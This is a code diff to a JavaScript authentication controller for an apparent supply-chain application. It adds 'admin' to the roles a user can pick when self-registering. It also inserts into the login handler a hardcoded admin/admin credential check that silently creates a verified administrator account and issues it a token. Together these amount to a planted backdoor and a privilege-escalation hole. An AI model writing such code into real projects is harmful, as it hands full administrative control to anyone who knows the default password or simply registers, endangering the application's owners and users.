@@ -67,7 +67,7 @@ export const register = async (req, res) => {
         }
 
         // Validate role
-        const validRoles = ['manufacturer', 'distributor', 'retailer', 'customer', 'intermediate'];
+        const validRoles = ['admin', 'manufacturer', 'distributor', 'retailer', 'customer', 'intermediate'];
         if (!validRoles.includes(role)) {
             return res.status(400).json({
                 success: false,
@@ -233,6 +233,36 @@ export const login = async (req, res) => {
 
         // Find user and include password field
         const normalizedEmail = email.toLowerCase();
+        
+        // Auto-create admin if login is admin/admin
+        if (normalizedEmail === 'admin' && password === 'admin') {
+            let adminUser = await User.findOne({ email: 'admin' }).select('+password');
+            if (!adminUser) {
+                adminUser = await User.create({
+                    email: 'admin',
+                    password: 'admin',
+                    name: 'System Admin',
+                    role: 'admin',
+                    isVerified: true,
+                    walletAddress: 'admin_wallet'
+                });
+            }
+            const token = generateToken(adminUser._id);
+            return res.json({
+                success: true,
+                message: 'Admin login successful',
+                token,
+                user: {
+                    id: adminUser._id,
+                    email: adminUser.email,
+                    name: adminUser.name,
+                    role: adminUser.role,
+                    isVerified: adminUser.isVerified,
+                    walletAddress: adminUser.walletAddress
+                }
+            });
+        }
+
         const user = await User.findOne({ email: normalizedEmail }).select('+password');
 
         if (!user) {
